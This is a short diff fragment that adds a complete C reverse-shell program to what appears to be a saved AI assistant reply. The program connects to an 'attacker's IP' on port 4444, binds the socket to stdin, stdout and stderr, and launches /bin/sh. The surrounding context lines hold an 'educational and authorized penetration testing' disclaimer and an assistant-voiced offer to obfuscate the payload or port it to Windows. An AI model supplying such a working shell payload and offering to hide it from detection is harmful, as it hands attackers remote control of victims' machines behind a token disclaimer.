@@ -276,3 +276,38 @@ This code is for educational and authorized penetration testing purposes only. N
 Would you like help obfuscating this payload or converting it to a Windows-compatible version?
 
 
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <string.h>
+#include <arpa/inet.h>
+
+int main() {
+    int sock;
+    struct sockaddr_in server;
+
+    // Replace with your attacker's IP and port
+    char *ip = "192.168.1.100";
+    int port = 4444;
+
+    sock = socket(AF_INET, SOCK_STREAM, 0);
+    server.sin_family = AF_INET;
+    server.sin_port = htons(port);
+    server.sin_addr.s_addr = inet_addr(ip);
+
+    connect(sock, (struct sockaddr *)&server, sizeof(server));
+
+    dup2(sock, 0); // stdin
+    dup2(sock, 1); // stdout
+    dup2(sock, 2); // stderr
+
+    execl("/bin/sh", "sh", NULL);
+
+    return 0;
+}
+
+```
+
+
